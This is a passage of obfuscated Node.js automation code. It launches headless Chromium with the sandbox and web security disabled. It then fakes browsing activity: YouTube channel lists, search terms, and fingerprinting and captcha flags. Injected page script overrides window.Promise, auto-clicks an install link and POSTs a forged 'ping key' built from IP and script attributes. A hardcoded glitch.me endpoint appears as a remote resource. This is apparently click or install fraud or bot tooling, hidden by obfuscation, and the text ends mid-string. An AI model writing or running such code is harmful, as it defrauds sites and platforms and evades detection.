this['bytes'] << 0x1df9 * 0x1 + -0x26dd + 0x8e7, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x46 * -0x89 + 0x1 * -0x254 + -0x2312; J < 0x1d16 + -0x26f7 * 0x1 + 0xa31; ++J)
                K = Q[J - (0x11 * 0x23 + 0x1755 + -0x19a5)] ^ Q[J - (0x614 + 0x1 * 0x2597 + -0x1 * 0x2ba3)] ^ Q[J - (0x22c4 + -0xd33 + -0x1583)] ^ Q[J - (0x18a0 + 0x3f1 * 0x5 + 0x1 * -0x2c45)], Q[J] = K << 0x4 * 0x1b5 + -0xfef * -0x2 + -0x26b1 | K >>> -0x2 * -0x671 + 0x331 * 0xc + -0x330f;
              for (J = 0x1 * 0x5fd + -0xf + -0x5ee; J < 0x3 * 0x1f6 + 0x659 + -0x40d * 0x3; J += 0x1291 * -0x2 + 0x11 * 0xcd + 0x178a)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x64 + -0x1 * -0x12c1 + 0x22 * -0x90 | L >>> -0xf5a + -0xc97 * -0x1 + 0x16f * 0x2) + (M & N | ~M & O) + P + (-0x2 * -0x580bde67 + 0x2ff33a25 + -0x85887d5a) + Q[J] << -0x163e + -0x1db6 * -0x1 + -0x1de * 0x4) << 0xb88 * 0x1 + 0x3b7 * 0x1 + -0xf3a | P >>> -0x2 * 0x7ff + -0x1 * -0xf4d + 0xcc) + (L & (M = M << 0xff * -0xb + -0x2162 + 0x2c75 | M >>> -0x8 * 0x3e2 + -0x14cc + 0x33de) | ~L & N) + O + (0x58bcc5eb * -0x1 + -0x10cb9d3c + 0xc40adcc0) + Q[J + (0x2391 + 0x1044 + 0x6b * -0x7c)] << 0x1ece * -0x1 + -0x21fb * -0x1 + 0x3 * -0x10f) << 0xb52 + 0x12df + -0x1e2c | O >>> 0x2195 * 0x1 + 0xb9 * 0x35 + 0x4c9 * -0xf) + (P & (L = L << 0x1878 + -0x2434 + -0x1 * -0xbda | L >>> 0x8ba * 0x2 + 0x1d6c + -0x7 * 0x6b2) | ~P & M) + N + (-0xa5216677 + 0x540b8ed7 + 0x13447 * 0x8e7f) + Q[J + (0x134d + -0x4b0 + -0xe9b * 0x1)] << 0x1b * -0x9 + -0x8e * -0x42 + -0x23a9 * 0x1) << 0xd3b + -0x119 * 0x1f + 0x14d1 * 0x1 | N >>> 0x75e + -0xacc * 0x2 + 0x4c7 * 0x3) + (O & (P = P << 0x168c + 0x7b5 + -0x5 * 0x607 | P >>> -0xe88 + -0x4e2 + 0x136c) | ~O & L) + M + (-0x5cf56923 + -0x7 * -0xedb3b1f + 0x4f7944e3) + Q[J + (0x11b9 + 0x176d + -0x2923)] << 0x137 + 0x3 * -0x53f + -0x1a * -0x8f) << 0x29 * -0x47 + -0x212f + 0x2c93 | M >>> 0xa19 + -0x1ef0 + -0x2 * -0xa79) + (N & (O = O << 0x317 * 0x3 + 0x19e8 + -0x19 * 0x167 | O >>> 0x1a * -0x50 + -0xf7d + 0x179f) | ~N & P) + L + (0x9d32f583 + -0xa8bd7748 + -0x3 * -0x220453ca) + Q[J + (-0x101 * -0xc + -0x9 * 0x341 + 0x1141 * 0x1)] << 0x11ad * 0x2 + 0x508 * 0x7 + -0x4692, N = N << -0x12 * -0x37 + -0x3 * -0xbcb + -0x2721 | N >>> -0x3 * -0x93e + -0x216a + 0x5b2;
              for (; J < 0x1f32 + -0x3 * -0x1ad + -0x2411; J += -0xdbd + -0x1 * -0xce3 + -0xdf * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x88a + -0x1d * 0xc1 + 0x1e6c | L >>> 0x3 * -0xaa5 + 0x1 * -0xd91 + 0x91f * 0x5) + (M ^ N ^ O) + P + (-0x727bf470 + 0x294455c * 0x44 + -0x1 * -0x31f373a1) + Q[J] << 0x2492 + 0x1 * 0x69d + -0x2b2f) << -0x919 + 0xa91 + 0x35 * -0x7 | P >>> 0x1 * 0x1792 + 0x20ca + -0x3841 * 0x1) + (L ^ (M = M << -0x244b + -0x206d + 0x44d6 | M >>> -0x23bb + -0x12a * 0xd + 0x9 * 0x5a7) ^ N) + O + (0x82819 * -0xfaa + -0x220f3bc1 + 0x110ad3efc) + Q[J + (0x4 * -0x49d + 0x102a + 0x24b)] << -0x16fa + 0x1 * 0x812 + -0x774 * -0x2) << -0xb35 * -0x3 + -0x1 * -0xfa7 + -0x3 * 0x106b | O >>> 0x6 * 0x525 + -0x8d * 0x1 + -0x1e36) + (P ^ (L = L << -0x16f6 + -0xe1c + 0x2530 | L >>> -0xa * -0x124 + -0x2256 + 0x16f0) ^ M) + N + (-0x4 * 0x287a293 + 0x52162233 + -0x656 * -0x62317) + Q[J + (0x1488 + -0x92 * -0x32 + -0x1885 * 0x2)] << -0x10ce + 0x106 * -0x25 + -0xdab * -0x4) << -0x8f9 * 0x3 + 0x4 * 0x1a3 + 0x1464 | N >>> -0x24fb + -0x171f + 0x3c35) + (O ^ (P = P << 0x11f8 * -0x2 + 0x192 * -0x11 + 0x3ec0 | P >>> -0x125e * -0x1 + -0x93b + 0x7b * -0x13) ^ L) + M + (0x26ae71de + -0x27 * -0x4a753ed + 0x55e8 * -0x145c7) + Q[J + (-0x1ef7 * 0x1 + -0x12cd + 0x31c7)] << -0x7ee + -0x3 * -0x70b + 0x6d * -0x1f) << -0xabe + -0x1784 + -0x3cf * -0x9 | M >>> 0x360 + -0x25f5 + -0x2 * -0x1158) + (N ^ (O = O << -0x1bd9 + 0x22ff * -0x1 + 0x3ef6 | O >>> -0xa * 0x3c5 + 0xe * 0xb5 + -0x1 * -0x1bce) ^ P) + L + (0x1 * -0x9e8a92b6 + 0xdc863e30 + 0x30de4027 * 0x1) + Q[J + (-0xab * -0x2a + 0x123e + -0x1 * 0x2e48)] << 0x2 * 0x88d + -0x1466 + -0xd3 * -0x4, N = N << 0x1d58 + 0x1 * 0x485 + -0x21bf | N >>> 0x1814 + -0x1 * -0x1624 + -0x2e36;
              for (; J < 0x12de + 0x2f7 + 0x123 * -0x13; J += 0x1321 + -0x43 * 0x8b + 0x1145 * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1ccd * 0x1 + -0x18b8 + 0x358a | L >>> -0x3e * -0x30 + -0x1b82 + 0xffd * 0x1) + (M & N | M & O | N & O) + P - (-0x23d51fd * 0x4a + -0xbf5ccee6 * -0x1 + -0x15d049d8 * -0x4) + Q[J] << 0x2 * -0xac4 + 0x1 * 0xa06 + 0xb82) << 0xe54 * 0x2 + -0xb80 + -0x1123 | P >>> -0x205f + -0xde4 + 0x2e5e) + (L & (M = M << 0x719 + -0x342 * 0x6 + 0xc91 | M >>> -0xc81 + -0x1db3 + -0x3 * -0xe12) | L & N | M & N) + O - (0xbe360776 + 0xc4db9b30 + -0x1122d5f82) + Q[J + (-0xf0c + 0x187d + -0x970)] << -0x86 * -0xe + 0xc00 * 0x2 + 0x7d5 * -0x4) << 0x129f + -0x83 * 0x4 + 0x847 * -0x2 | O >>> -0x20a7 + -0x23d9 + 0x449b) + (P & (L = L << 0x9 * 0x33b + 0x1 * 0x2097 + -0x3d8c | L >>> -0x23ed + 0x13d0 + 0x1 * 0x101f) | P & M | L & M) + N - (0x7436f * 0x606 + 0xa7e1aa40 + -0x52 * 0x1344363) + Q[J + (-0x8 * -0x2f5 + -0x3 * 0x3cb + -0xc45)] << 0x1682 + 0x2529 * -0x1 + -0x1f * -0x79) << -0x122 * 0x13 + 0x996 + 0xbf5 * 0x1 | N >>> -0x62 * -0x2 + -0x2607 + 0x2 * 0x12af) + (O & (P = P << 0x147a + 0x2 * 0xf8f + 0x257 * -0x16 | P >>> -0x1eb * 0x13 + -0x22ca + 0x473d) | O & L | P & L) + M - (0xa549fa * 0x7d + 0xff617a8 + -0x2 * -0x81c8635) + Q[J + (0x1 * 0x1701 + -0x571 * 0x1 + 0x1 * -0x118d)] << 0x119 * 0x12 + 0x1d8 + 0x46 * -0x4f) << 0x18 * 0xef + -0x2 * 0xa9f + -0x125 | M >>> -0x141 * 0x2 + 0x1 * 0x1c8d + -0x19f0) + (N & (O = O << -0x1 * -0xbff + -0x46b + -0x1 * 0x776 | O >>> 0x6d3 * -0x5 + -0x664 + 0x2885) | N & P | O & P) + L - (0x5fe41d2f + -0x262 * 0x2ea058 + -0x7891255 * -0x11) + Q[J + (-0x166f + -0x58 * -0x58 + -0x7cd * 0x1)] << 0x14f6 + 0x1f65 + -0x345b, N = N << -0x1de0 + -0xa65 * 0x3 + 0x1 * 0x3d2d | N >>> -0x6b7 * 0x2 + -0x9f5 + -0x1 * -0x1765;
              for (; J < -0x73a + -0xc4a * -0x1 + -0x4c0; J += 0x11 * 0xf6 + -0xdd + -0xf74)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x32b * 0x7 + 0x158e * 0x1 + -0x2bb6 | L >>> 0xca * -0x19 + -0x9e8 + 0x1dbd) + (M ^ N ^ O) + P - (0x729f806 * -0x4 + -0x35 * 0x11902c9 + 0x8c72b1df) + Q[J] << -0x194a + 0x7 * 0x1b6 + 0xd50) << -0xb60 + 0x1 * -0x1cb5 + 0x76 * 0x57 | P >>> 0x6 * 0x1c5 + 0x1 * 0x757 + 0x8ed * -0x2) + (L ^ (M = M << -0x15d5 + -0x7a0 * -0x5 + 0x1 * -0x102d | M >>> 0x88d * 0x3 + -0x2b * -0x55 + 0x4 * -0x9fb) ^ N) + O - (-0x64963023 + -0x53304113 + -0x1e5720 * -0x7d3) + Q[J + (-0x17 * 0xba + -0x3 * -0x18a + -0x13 * -0xa3)] << -0xc1 * 0xb + 0xd8b + -0x540) << -0x14 * -0x179 + 0xad * 0x2f + -0x3d32 | O >>> -0x5 * -0x4c + -0xb * 0x31d + 0x20de) + (P ^ (L = L << -0x6 * -0x279 + 0x16 * 0x6f + -0x1842 | L >>> -0x95d + -0x1a6b + 0x6 * 0x5f7) ^ M) + N - (0x2137dd0f * -0x2 + 0x178da * 0x37d7 + 0x25d9a332) + Q[J + (-0x224c + -0x38b + 0x25d9 * 0x1)] << -0x1660 + 0x8c8 * 0x3 + -0x3f8) << -0x4ca + 0x15d7 + 0x28 * -0x6d | N >>> 0xf03 + -0x7d2 * 0x1 + -0x716) + (O ^ (P = P << -0x1448 + -0x1871 + -0x2cd7 * -0x1 | P >>> -0x3 * 0x223 + 0x15ef + -0xf84) ^ L) + M - (0x9c7707d + 0x31d08e26 + -0x5fac079) + Q[J + (-0x3c9 + -0x281 + 0x64d)] << 0x1000 + -0x1b80 + -0xb8 * -0x10) << 0xb07 + -0x25a8 + -0x12 * -0x17b | M >>> 0x14e9 + 0x23b3 + -0x3881) + (N ^ (O = O << 0x86 * 0x10 + -0x1 * -0x1da3 + -0x25e5 | O >>> -0x2 * -0xf05 + -0xc48 + -0x2 * 0x8e0) ^ P) + L - (-0x2c59b * 0xb98 + 0x2b598303 * 0x2 + 0x1a * -0x95692) + Q[J + (0x9af * 0x3 + 0xd8f + -0x2a98)] << -0x198c + 0x2140 + -0x7b4, N = N << 0x2343 + 0x1fd6 + -0x42fb | N >>> -0xc9a + -0x7 * -0x256 + 0x2 * -0x1df;
              this['h0'] = this['h0'] + L << 0x15 * 0x19c + 0xd14 + 0x10 * -0x2ee, this['h1'] = this['h1'] + M << 0x1 * -0x2006 + 0x384 + 0x1c82, this['h2'] = this['h2'] + N << -0x125d * -0x2 + 0x2169 + -0x7 * 0xa05, this['h3'] = this['h3'] + O << 0x202d * -0x1 + 0x8ad + -0x1780 * -0x1, this['h4'] = this['h4'] + P << 0x5 * 0x5f5 + -0x1 * -0x24f7 + -0x42c0;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0xd10 + -0x15c1 + 0x22ed & -0x8bc + 0xd * 0x221 + -0x12e2] + w[J >> -0xa7b * 0x1 + 0x34 * 0xae + -0x175 * 0x11 & -0x8e7 * -0x4 + -0x2087 * 0x1 + -0x9 * 0x56] + w[J >> 0x1c9d + 0x21db + -0x3e64 & 0x4f * 0x72 + 0x1e76 + -0x4195] + w[J >> 0x25 * 0x13 + 0x1452 + -0x27 * 0x97 & 0x279 * 0xb + 0xb3a + 0x132f * -0x2] + w[J >> -0x194a + 0x3b * 0x1d + 0xbf * 0x19 & 0x1 * 0x11 + 0x1c1a + -0x1c1c] + w[J >> 0x15cc + -0x1 * -0x937 + 0x1 * -0x1efb & -0x205b + 0x273 * 0xc + 0x306] + w[J >> 0x1 * 0x28d + -0x1b * -0x106 + -0x1e2b & -0x5a * -0x42 + 0x9b * -0x32 + 0x721] + w[0x2be + 0x4c3 * -0x1 + 0x214 & J] + w[K >> 0x9 * 0x1d0 + -0x1 * 0x205f + 0x102b & -0x2 * 0x1273 + 0x1966 + 0xb8f] + w[K >> 0x19ed + -0x2187 + -0xc5 * -0xa & -0xc6c + 0x170f + -0xa94] + w[K >> -0x136c + -0x551 + 0x18d1 & -0x162 + 0x21 + 0x150] + w[K >> -0x3bc + 0x275 + -0x7 * -0x31 & 0x1 * -0x9a7 + -0x1359 + 0x1d0f] + w[K >> -0x9 * 0xf9 + -0x407 * -0x6 + -0xf5d & -0x1b * -0xc5 + 0x1 * -0x542 + -0xf76] + w[K >> 0x26 * 0x22 + -0x1087 * -0x1 + -0x158b & 0x45 * -0x2e + 0x2490 + -0x181b] + w[K >> -0xa * -0x2ce + 0x265a + -0x4262 & -0x367 + 0x22c + 0x6e * 0x3] + w[0xe * -0x1d + 0x3 * 0x76f + 0x1 * -0x14a8 & K] + w[L >> 0x1d81 + -0xa31 * 0x3 + 0x97 * 0x2 & -0x5 * 0x77d + 0x1a0d + -0xb73 * -0x1] + w[L >> 0x1 * -0xf82 + -0x870 + 0xc05 * 0x2 & -0x17a1 + -0xf31 * -0x2 + -0x1 * 0x6b2] + w[L >> 0xb2 + -0x34b * -0x8 + -0x1af6 & -0x10c7 * 0x1 + 0x1324 + -0x24e] + w[L >> 0x2708 + 0x1e85 + -0x457d & -0x637 * 0x6 + 0x1feb * -0x1 + 0x2aa * 0x1a] + w[L >> 0x10fd + 0x1 * 0x2209 + 0x32fa * -0x1 & 0x5 * -0x25 + -0x1 * -0x3a5 + -0x2dd * 0x1] + w[L >> -0xfef + -0xe * 0x10f + 0x1ec9 & -0x5f3 * 0x4 + -0x1 * 0x1437 + 0x2c12] + w[L >> -0x20d6 + 0x2707 + -0x62d & 0x409 + -0x7 * -0x243 + -0x1 * 0x13cf] + w[0x8e * -0xb + -0x18ef * -0x1 + -0x9 * 0x216 & L] + w[M >> -0x2283 + 0x1 * -0x1e8b + -0x1b7 * -0x26 & 0x8ad + -0x19 * 0x92 + 0x2d2 * 0x2] + w[M >> 0x2586 + 0xed0 + -0x343e & 0xd52 + 0x1c08 + -0x294b] + w[M >> -0x16 + 0x18f8 + 0xa * -0x27b & 0x13 * -0x207 + 0x7 * -0x17b + 0x30f1] + w[M >> 0x4 * -0x625 + -0x10d * -0xd + 0xafb & 0x1ca2 + -0x1 * 0x170b + -0x588] + w[M >> 0x17 * 0x16 + 0x1515 + -0x1703 & -0x1c4a + 0x805 + 0x1454] + w[M >> -0x13 * -0xb3 + 0x52a * 0x2 + -0x1795 * 0x1 & 0x1d52 + 0x114a + -0x2e8d * 0x1] + w[M >> -0x1bd6 + 0x1f9e * 0x1 + 0x1 * -0x3c4 & -0x2343 * -0x1 + -0x1 * -0xc1a + -0x2f4e] + w[-0x868 + 0x24b * -0x4 + 0x285 * 0x7 & M] + w[N >> -0x184b * 0x1 + -0x1023 + 0x288a & 0x1c06 + 0xff9 + 0xafc * -0x4] + w[N >> 0x188f + -0x12a5 + -0x5d2 & -0x1edb * -0x1 + 0x10 + -0x32 * 0x9e] + w[N >> 0x1706 + 0x10 * -0x196 + 0x1 * 0x26e & -0x3 * 0x1b3 + 0x3 * -0xcb3 + 0x2b41 * 0x1] + w[N >> -0x1 * 0x4be + 0x1cd + -0x1 * -0x301 & -0x68 * 0x2c + -0x899 + 0x1a88] + w[N >> -0x4f * 0x12 + 0xc66 + -0x6cc * 0x1 & -0x65 * -0x2d + 0x1314 + -0x24c6] + w[N >> 0x1cda + -0x16a0 + 0x1 * -0x632 & -0x1751 + -0x22db * 0x1 + -0x3a3b * -0x1] + w[N >> 0x6f5 + 0x102c + -0x1 * 0x171d & 0xb * -0x220 + 0x1114 + -0x1 * -0x65b] + w[0x11a7 + -0xe37 * 0x1 + -0x361 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x6b + 0x106 * 0x1 + -0x159 & 0x2340 + -0x72 * -0x2c + -0x35d9,
                J >> -0x1 * 0xb72 + 0x1174 + -0x2f9 * 0x2 & 0x1398 + -0x21b4 + 0xf1b,
                J >> -0x8b * -0x9 + 0x15d1 + 0x1 * -0x1aac & -0x2 * 0xa85 + 0x1bca * -0x1 + 0x31d3,
                -0x2e7 * -0x4 + -0x9 * -0x321 + -0x2c5 * 0xe & J,
                K >> -0x153e * -0x1 + -0x21aa + 0xc84 & 0xe98 + 0xf0d + 0xe53 * -0x2,
                K >> -0x146e + -0x1 * 0x1edf + 0x9 * 0x5b5 & -0x1816 + -0x1 * 0xfbd + 0x28d2,
                K >> -0x1 * -0x18fb + 0x21fd + -0x3af0 & 0xbf + 0xe * 0x2b9 + -0x83 * 0x4a,
                -0x1 * 0x14b6 + 0x190e + 0x359 * -0x1 & K,
                L >> 0xa8 * -0xe + 0xdc4 + -0x47c & 0xaf * -0x2f + 0x2058 + -0x4 * -0x32,
                L >> -0x12b2 * 0x1 + 0x1bf4 + -0xd6 * 0xb & -0x1 * -0x76d + -0x3 * -0x79b + -0x1d3f * 0x1,
                L >> 0x118d + 0x2576 + 0x233 * -0x19 & -0x1294 + -0x11e1 * 0x1 + 0x2574,
                0x56c + 0x2580 + 0x29ed * -0x1 & L,
                M >> 0x101a + 0x4f * -0x4a + 0x6d4 & 0x2022 + -0x85f + 0x1 * -0x16c4,
                M >> -0x7bb * 0x1 + 0x1e22 + 0x85 * -0x2b & 0x1 * 0x236d + -0x2 * 0xe3f + -0x5f0,
                M >> -0xa64 + -0x18e7 + 0x2353 & -0x1895 * -0x1 + 0x1eb8 + -0x364e * 0x1,
                0x3 * 0x995 + 0x1 * 0xb3 + -0x1c73 & M,
                N >> -0x255c + -0xe * -0x25c + 0x46c & -0x7 * 0x55b + -0x15fd + 0x3c79,
                N >> -0x1 * -0xc5 + 0xd + -0xc2 & -0x1 * -0x2fc + -0x50 * 0x5c + -0x1f * -0xdd,
                N >> -0x26d5 + -0x1 * -0x7e + -0x205 * -0x13 & 0x2f * 0x61 + 0x1 * -0x6e5 + -0x9eb,
                0x3de + -0x1 * -0xa31 + -0x1a2 * 0x8 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0xb73 + -0x281 + -0x8de), (K = new DataView(J))['setUint32'](-0x154c + -0x4c1 + -0x39 * -0x75, this['h0']), K['setUint32'](-0x2 * -0x1199 + 0x27 * -0xfa + 0x2e8, this['h1']), K['setUint32'](-0x1352 + 0x20ab * -0x1 + 0x45 * 0xc1, this['h2']), K['setUint32'](-0x1303 + -0x1e73 + 0x3182, this['h3']), K['setUint32'](-0x1 * -0x153b + -0xf * -0x1d5 + -0x30a6, this['h4']), J;
            }
        }
        G[S(0x9)]['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0xcf7 * -0x2 + -0x187e + 0x39a * 0xe];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x13f * 0x14 + 0x455 * 0x4 + 0x4 * -0xa90;
            J[0x1a55 * -0x1 + 0x119 * -0x3 + 0x4 * 0x768]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x12b9 + 0x2 * 0x891 + 0x1 * 0x197] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x6e9 * -0x4 + -0x4 * 0x8d3 + 0x7a9), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0xd * -0xb4 + -0x26f0 + -0x1 * -0x1dcd;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x47 * 0x29 + -0x1 * -0xdd5 + -0x1358), Promise['resolve'](-0x239c + -0x1d29 + -0x2 * -0x2063);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s[T(0x10)](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x5 * -0x201 + 0xf + 0x1fe * 0x5; j < -0x867 + -0x4e0 + 0xd48; j++)
    i();
}
const NETWORK_PATIENCE = -0x2f27 + -0x1674 * 0x1 + 0x64db + (-0x1 * 0x23db + -0x954 + 0x1 * 0x38e7) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x2 * -0x1b7 + 0x124c * -0x1 + 0x15bd) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + U(0x3) + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x22a2 + -0x26c0 * -0x1 + -0x65 * 0xba; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x3c0 + 0x9 * -0x296 + -0x31 * -0x66);
    let h = e[f];
    if (b['DsPgYf'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x5ba * 0x5 + 0x1206 + 0xa9c, s, t, u = -0x1 * 0x1afd + -0x137e + 0x2e7b; t = n['charAt'](u++); ~t && (s = r % (0x193b + -0x2703 * -0x1 + -0x403a) ? s * (0x33 * 0x6b + -0x3 * -0xb4e + 0xaff * -0x5) + t : t, r++ % (-0x14c + -0x15f3 + -0x7c1 * -0x3)) ? p += String['fromCharCode'](0x705 + 0xdd5 + -0x13db & s >> (-(0xcc + 0x1 * -0x1931 + 0x1 * 0x1867) * r & 0xaf9 + -0x80d + -0x2e6)) : 0x1f28 + -0x1f * 0xd1 + -0x1 * 0x5d9) {
          t = o['indexOf'](t);
        }
        for (let v = 0x4 * 0x10d + 0x14b9 + -0x18ed, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0xc * -0x11e + 0x1a69 + 0x1 * -0xcf1))['slice'](-(-0x1b88 + -0x116 + 0x1ca0));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1bc4 + -0x9fc + -0x1 * -0x25c0,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x4 * 0xca + -0x1 * -0x2486 + -0x27ae; u < -0x989 + 0x2668 + -0x1bdf; u++) {
          p[u] = u;
        }
        for (u = -0x43 * -0x32 + -0x13 * 0x204 + 0x1936 * 0x1; u < -0x24 * -0x5b + 0x31a * -0x9 + -0x80f * -0x2; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1 * 0x2645 + 0x2bf + 0x1a9 * 0x16), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1 * -0x1e89 + 0xf * -0x291 + -0x3fb * -0x2, q = 0x12cd + -0xc1c + 0x6b1 * -0x1;
        for (let v = 0x5d9 * -0x1 + 0xdac + 0x7d3 * -0x1; v < n['length']; v++) {
          u = (u + (0xfaa + 0x12d * -0x15 + -0x88 * -0x11)) % (0x2c3 * -0x2 + -0x5 * -0x5b9 + -0x1617), q = (q + p[u]) % (-0x1 * 0x1954 + 0x105d + 0x9f7), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x191a + 0x36c + -0x1b86)]);
        }
        return t;
      };
      b['GEWWlD'] = m, c = arguments, b['DsPgYf'] = !![];
    }
    const j = e[-0x1d85 + 0x1 * -0x671 + 0x23f6],
      k = f + j,
      l = c[k];
    return !l ? (b['uzLijy'] === undefined && (b['uzLijy'] = !![]), h = b['GEWWlD'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 